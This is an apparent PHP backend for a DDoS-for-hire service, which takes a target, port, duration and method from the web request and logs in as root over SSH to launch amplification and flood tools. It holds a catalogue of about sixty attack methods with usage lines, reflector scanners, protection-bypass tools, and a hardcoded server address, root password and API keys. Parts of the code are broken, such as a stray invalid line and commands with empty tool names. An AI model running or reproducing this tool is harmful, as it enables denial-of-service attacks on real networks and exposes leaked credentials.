<?php
if (!function_exists('ssh2_connect')){
        die("Install ssh2 module.\n");
}
if ($_GET['key'] != "fe0c7eb420462ec3d22bc699b9097e6a"){
        die("Go Away.");
}
if (isset($_GET['host'], $_GET['port'], $_GET['time'], $_GET['method'])) {
        class ssh2 {
                var $connection;
                function __construct($host, $user, $pass) {
                        if (!$this->connection = ssh2_connect($host, 22))
                                throw new Exception(die("Error connecting to server"));
                        if (!ssh2_auth_password($this->connection, $user, $pass))
                                throw new Exception(die("Error with login credentials"));
                }
 
                function exec($cmd) {
                        if (!ssh2_exec($this->connection, $cmd))
                                throw new Exception(die("Error executing command: $cmd"));
 
                        ssh2_exec($this->connection, 'exit');
                        unset($this->connection);
                }
        }
        $port = (int)$_GET['port'] > 0 && (int)$_GET['port'] < 65536 ? $_GET['port'] : 80;
        $port = preg_replace('/\D/', '', $port);
        $ip = preg_match('/^[a-zA-Z0-9\.-_]+$/', $_GET['host']) ? $_GET['host'] : die();
        $time = (int)$_GET['time'] > 0 && (int)$_GET['time'] < (60*308) ? (int)$_GET['time'] : 30;
        $time = preg_replace('/\D/', '', $time);
 	      $threads = (int)$_GET['threads'] > 0 && (int)$_GET['threads'] < 2048 ? $_GET['threads'] : 100;
	      $threads = preg_replace('/\D/', '', $threads);
	      $method = $_GET['method'];
        $domain = $_GET['host'];
        if(!filter_var($domain, FILTER_VALIDATE_URL) && !filter_var($domain, FILTER_VALIDATE_IP)) {
            die("Invalid Domain");
        }
        $id = $_GET['id'];
        $smDomain = str_replace(".", "", $domain);
        $smDomain = str_replace("http://", "", $smDomain);
        // v1 Reflection Methods
        // ScannedMethods = ["ldap", "ntp", "tftp", "ssdp", "portmap", "chargen", "sentinel", "netbios", "mssql", "ts3"]
        // Extramethods = ["vse", "telnet", "tcp-abuse", "udp-abuse", "dominate"]
        // bypassmethods = ["ovhbypass", "cfbypass", "nfobypass", "bo4bypass"]
        // vipmethods = ["hun-fun", "ass-crk", "eft-pwr", "pmp-pmp", "zch-cri"]
        // extramethods = ["essyn", "csyn", "xsyn", "zsyn", "issyn"]
        // servermethods = ["winsyn", "winseqid", "yubina", "prowin"]
        // totalv1methods = "33"
        // # LDAP:       ./ldap $IP $PORT $LIST $THREADS $PPS $TIME       || LDAPSCAN:     ./ldapscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # SSDP:       ./ssdp $IP $PORT $LIST $THREADS $PPS $TIME       || SSDPSCAN:     ./ssdpscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # NTP:        ./ntp $IP $PORT $LIST $THREADS $PPS $TIME        || NTPSCAN:      ./ntpscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # CHARGEN:    ./chargen $IP $PORT $LIST $THREADS $PPS $TIME    || CHARGENSCAN:  ./chargenscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # SENTINEL:   ./sentinel $IP $PORT $LIST $THREADS $PPS $TIME   || SENTINELSCAN: ./sentinelscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # NETBIOS:    ./netbios $IP $PORT $LIST $THREADS $PPS $TIME    || NETBIOSSCAN:  ./netbiosscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # MSSQL:      ./mssql $IP $PORT $LIST $THREADS $PPS $TIME      || MSSQLSCAN:    ./mssqlscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # TS3:        ./ts3 $IP $PORT $LIST $THREADS $PPS $TIME        || TS3SCAN:      ./ts3scan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # PORTMAP:    ./portmap $IP $PORT $LIST $THREADS $PPS $TIME    || PORTMAPSCAN:  ./portmapscan $IPSTART $IPEND $LIST $THREADS $DELAY
        // # TFTP:       ./sentinel $IP $PORT $LIST $THREADS $PPS $TIME   || SENTINELSCAN: its broken :/ ive tried 3 different versions LMFAO
        // # PROWIN:     ./prowin $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
        // # WINSYN:     ./winsyn $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
        // # WINSEQID:   ./winseqid $IP                                   || Note this attack does not stop on its own, MUST KILL PROCESS!
        // # YUBINA:     ./yubina $IP                                     || Note this attack does not stop on its own, MUST KILL PROCESS!
        // # OVHBYPASS:  ./ovhbypass $IP $PORT $TIME UDP                  || Source has 2 diffent methods: UDP and HTTP < we are using UDP
        // # NFOBYPASS:  ./nfobypass $IP $PORT
        // # CFBYPASS:   php CF_Bypass $URL $LIST $THREADS $TIME          || Needs a proxy list || Url must be http://SITE/ or https://SITE/
        // # BO4BYPASS:  ./bo4bypass $IP $PORT $PPS $TIME
        // # VSE:        ./vse $IP $THREADS $PPS $TIME
        // # DOMINATE:   ./dominate $IP $PORT $THREADS $PPS $TIME
        // # TELNET:     ./telnet $IP $THREADS $PPS $TIME
        // # TCP_ABUSE:  ./tcp_abuse $IP $PORT $THREADS $PPS $TIME
        // # UDP_ABUSE:  ./udp_abuse $IP $PORT $THREADS $PPS $TIME        || SO this method is a server suspended, apparently you can go after ranges this is the optional input: ./udp_abuse $IP $PORT $THREADS $PPS $TIME $STARTIP $ENDIP
        // # CSYN:       ./csyn $IP $PORT $THREADS $PPS $TIME
        // # XSYN:       ./xsyn $IP $PORT $THREADS $PPS $TIME
        // # ZSYN:       ./zsyn $IP $PORT $THREADS $PPS $TIME
        // # ISSYN:      ./issyn.c $IP $PORT $THREADS $PPS $TIME
        // # ESSYN:      ./essyn.c $IP $PORT $THREADS $PPS $TIME
        if($_GET['method'] == "LDAP") { $command = "cd /root/amp/methods/v1/reflection/ldap && screen -dmS Id{$id} ./ldap {$ip} {$port} ldap.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "SSDP") { $command = "cd /root/amp/methods/v1/reflection/ssdp && screen -dmS Id{$id} ./ssdp {$ip} {$port} ssdp.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "NTP") { $command = "cd /root/amp/methods/v1/reflection/ntp && screen -dmS Id{$id} ./ntp {$ip} {$port} ntp.txt {$threads} -1 {$time}"; }
	elseif($_GET['method'] == "CHARGEN") { $command = "/root/amp/methods/v1/reflection/chargen && screen -dmS Id{$id} ./chargen {$ip} {$port} chargen.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "TFTP") { $command = "cd /root/amp/methods/v1/reflection/tftp && screen -dmS Id{$id} ./tftp {$ip} {$port} tftp.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "PORTMAP") { $command = "cd /root/amp/methods/v1/reflection/portmap && screen -dmS Id{$id} ./portmap {$ip} {$port} portmap.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "SENTINEL") { $command = "cd /root/amp/methods/v1/reflection/sentinel && screen -dmS Id{$id} ./sentinel {$ip} {$port} sentinel.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "NETBIOS") { $command = "cd /root/amp/methods/v1/reflection/netbios && screen -dmS Id{$id} ./netbios {$ip} {$port} netbios.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "MSSQL") { $command = "cd /root/amp/methods/v1/reflection/mssql && screen -dmS Id{$id} ./mssql {$ip} {$port} mssql.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "TS3") { $command = "cd /root/amp/methods/v1/reflection/ts3 && screen -dmS Id{$id} ./ts3 {$ip} {$port} ts3.txt {$threads} -1 {$time}"; }
        // v1 Special CUSTOM methods
        // vipmethods = ["hun-fun", "ass-crk", "eft-pwr", "pmp-pmp", "zch-cri"]
        elseif($_GET['method'] == "HUN-FUN") { $command = "cd /root/amp/methods/v1/custom/hun-fun && screen -dmS Id{$id} ./hun-fun {$ip} {$port} hun-fun.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "ASS-CRK") { $command = "cd /root/amp/methods/v1/custom/ass-crk && screen -dmS Id{$id} ./ass-crk {$ip} {$port} ass-crk.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "EFT-PWR") { $command = "cd /root/amp/methods/v1/custom/eft-pwr && screen -dmS Id{$id} ./eft-pwr {$ip} {$port} eft-pwr.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "PMP-PMP") { $command = "cd /root/amp/methods/v1/custom/pmp-pmp && screen -dmS Id{$id} ./pmp-pmp {$ip} {$port} pmp-pmp.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "ZCH-CRI") { $command = "cd /root/amp/methods/v1/custom/zch-cri && screen -dmS Id{$id} ./zch-cri {$ip} {$port} zch-cri.txt {$threads} -1 {$time}"; }
        // v1 Extra methods
        // Extramethods = ["vse", "telnet", "tcp-abuse", "udp-abuse", "dominate"]
        elseif($_GET['method'] == "VSE") { $command = "cd /root/amp/methods/v1/reflection/ && screen -dmS Id{$id} ./ {$ip} {$port} .txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "TELNET") { $command = "cd /root/amp/methods/v1/reflection/ && screen -dmS Id{$id} ./ {$ip} {$port} .txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "TCPABUSE") { $command = "cd /root/amp/methods/v1/reflection/ && screen -dmS Id{$id} ./ {$ip} {$port} .txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "UDPABUSE") { $command = "cd /root/amp/methods/v1/reflection/ && screen -dmS Id{$id} ./ {$ip} {$port} .txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "DOMINATE") { $command = "cd /root/amp/methods/v1/reflection/ && screen -dmS Id{$id} ./ {$ip} {$port} .txt {$threads} -1 {$time}"; }
        // v2 reflection methods
        // ScannedMethodsII = ["dns", "mdns", "db2", "arceus", "echo", "snmp", "memcache", "rip", "reaper", "heartbeat"]
        // TCPCollection = ["tcp-psh", "tcp-rst", "tcp-fin", "tcp-xmas", "tcp-ack"]
        // ExtraMethodsIII = ["grenade", "zap", "rawudp", "bogus", "wizard"]
        // VIPMethodsII = ["msqdnm", "tfdnp", "lndp", "ardmsp"]
        // ExtraMethodsIV = ["udp_vse1", "udp_vse2", "ejunk", "xanax", "frag"]
        // totalv2methods = "29"
        // # DNS:       ./dns $IP $PORT $FILE $THREADS $TIME            || DNSSCAN:      ./dnsscan (broken)
        // # SNMP:      ./snmp $IP $PORT $FILE $THREADS $PPS $TIME      || SNMPSCAN:     ./snmpscan $IPSTART $IPEND $FILE $THREADS $MS
        // # DB2:       ./db2 $IP $PORT $FILE $THREADS $PPS $TIME       || DB2SCAN:      ./db2scan $IPSTART $IPEND $FILE $THREADS $MS
        // # ECHO:      ./echo $IP $PORT $LIST $THREADS $PPS $TIME      || ECHOSCAN:     ./echoscan $IPSTART $IPEND $FILE $THREADS $MS
        // # MDNS:      ./mdns $IP $PORT $LIST $THREADS $PPS $TIME      || MDNSSCAN:     ./mdnsscan $IPSTART $IPEND $FILE $THREADS $MS
        // # MEMCACHE:  ./memcache $IP $PORT $FILE $THREADS $PPS $TIME  || MEMCACHESCAN: ./memcachescan $IPSTART $IPEND $FILE $THREADS $MS
        // # RIP:       ./rip $IP $PORT $FILE $THREADS $PPS $TIME       || RIPSCAN:      ./ripscan $IPSTART $IPEND $FILE $THREADS $MS
        // # REAPER:    ./reaper $IP $PORT $FILE $THREADS $PPS $TIME    || REAPERSCAN:   ./reaperscan $IPSTART $IPEND $FILE $THREADS $MS
        // # HEARTBEAT: ./heartbeat $IP $PORT $FILE $THREADS $PPS $TIME || HEATBEATSCAN: ./heartbeatscan $IPSTART $IPEND $FILE $THREADS $MS
        // # ARCEUS:    ./arceus $IP $PORT $FILE $THREADS $PPS $TIME    || ARCEUSSCAN:   ./arceusscan $IPSTART $IPEND $FILE $THREADS $MS
        // # Grenade:   ./grenade $IP $THREADS $PPS $TIME $SOURCEIP
        // # ZAP:       ./zap $IP $PORT $THREADS $PPS $TIME
        // # WIZARD:    ./wizard $IP $PORT $THREADS $PPS $TIME
        // # BOGUS:     ./bogus $IP $PORT $THREADS $PPS $TIME
        // # RAWUDP:    ./rawudp $IP $PPS $THREADS $TIME
        // # TCP-PSH:   ./tcp-psh.c $IP $THREADS $PPS $TIME
        // # TCP-RST:   ./tcp-rst.c $IP $THREADS $PPS $TIME
        // # TCP-XMAS:  ./tcp-xmas.c $IP $THREADS $PPS $TIME
        // # TCP-FIN:   ./tcp-fin.c $IP $THREADS $PPS $TIME
        // # TCP-ACK:   ./tcp-ack.c $IP $THREADS $PPS $TIME
        // # UDP-VSE1:  ./UDP_VSE $IP $PORT $PPS $TIME
        // # UDP_VSE2   ./UDP_VSE2 $IP $PORT $PPS $THREADS $TIME
        // # EJUNK:     ./ejunk $IP $PORT $THREADS $PPS $TIME
        // # XANAX:     ./xanax $IP $THREADS $PPS $TIME
        // # FRAG:      ./frag $IP $PORT $THREADS $PPS $TIME
        // # ARME:      ./arme $URL $THREADS $LIST $TIME (SAYS MANUAL IP, WTF? IDK)
        elseif($_GET['method'] == "DNS") { $command = "cd /root/amp/methods/v2/reflection/dns && screen -dmS Id{$id} ./dns {$ip} {$port} dns.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "MDNS") { $command = "cd /root/amp/methods/v2/reflection/mdns && screen -dmS Id{$id} ./mdns {$ip} {$port} mdns.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "DB2") { $command = "cd /root/amp/methods/v2/reflection/db2 && screen -dmS Id{$id} ./db2 {$ip} {$port} db2.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "ECHO") { $command = "cd /root/amp/methods/v2/reflection/echo && screen -dmS Id{$id} ./echo {$ip} {$port} echo.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "MEMCACHE") { $command = "cd /root/amp/methods/v2/reflection/memcache && screen -dmS Id{$id} ./memcache {$ip} {$port} memcache.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "RIP") { $command = "cd /root/amp/methods/v2/reflection/rip && screen -dmS Id{$id} ./rip {$ip} {$port} rip.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "REAPER") { $command = "cd /root/amp/methods/v2/reflection/reaper && screen -dmS Id{$id} ./reaper {$ip} {$port} reaper.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "HEARTBEAT") { $command = "cd /root/amp/methods/v2/reflection/heartbeat && screen -dmS Id{$id} ./heartbeat {$ip} {$port} heartbeat.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "SNMP") { $command = "cd /root/amp/methods/v2/reflection/snmp && screen -dmS Id{$id} ./snmp {$ip} {$port} snmp.txt {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "ARCEUS") { $command = "cd /root/amp/methods/v2/reflection/arceus && screen -dmS Id{$id} ./arceus {$ip} {$port} arceus.txt {$threads} -1 {$time}"; }
        // v2 extra methods
        // ExtraMethodsIII = ["grenade", "zap", "rawudp", "bogus", "wizard"]
        elseif($_GET['method'] == "GRENADE") { $command = "cd /root/amp/methods/layer4/v1/bandwidth/other && screen -dmS Id{$id} ./grenade {$ip} {$threads} -1 {$time} 192.168.0.1"; }
        elseif($_GET['method'] == "ZAP") { $command = "cd /root/amp/methods/layer4/v1/bandwidth/other && screen -dmS Id{$id} ./zap {$ip} {$port} {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "RAWUDP") { $command = "cd /root/amp/methods/layer4/v1/bandwidth/other && screen -dmS Id{$id} ./rawudp {$ip} -1 {$threads} {$time}"; }
        elseif($_GET['method'] == "BOGUS") { $command = "cd /root/amp/methods/layer4/v1/bandwidth/other && screen -dmS Id{$id} ./bogus {$ip} {$port} {$threads} -1 {$time}"; }
        elseif($_GET['method'] == "WIZARD") { $command = "cd /root/amp/methods/layer4/v1/bandwidth/other && screen -dmS Id{$id} ./wizard {$ip} {$port} {$threads} -1 {$time}"; }
        // stop attack < ID
        elseif($_GET['method'] == "STOP") { $command = "screen -X -S Id{$id} quit"; }
        else die("error");
        ScannedMethods = ["ldap", "ntp", "tftp", "ssdp", "portmap", "chargen", "sentinel", "netbios", "mssql", "ts3"]

    	$pretty = "Sending To {$ip}:{$port} using {$method} with {$threads} threads for {$time} seconds.";
        $disposable = new ssh2("185.244.25.189", "root", "illiteracyisthenextdegeneracy");
        $disposable->exec($command);
        die($pretty);
}
//  IP/API.php/?key=YOURFUCKINGKEY&host=[host]&port=[port]&method=[method]&time=[time]
//  exp: 1.1.1.1/x.php?key=YOURFUCKINGKEY&host=8.8.8.8&port=80&method=udp&time=100
//  185.244.25.189/private.php?key=fe0c7eb420462ec3d22bc699b9097e6a&host=8.8.8.8&port
//  185.244.25.189/private.php?key=n3tbl0ck&host=8.8.8.8&port=80&time=100&method=CLDAP
?>
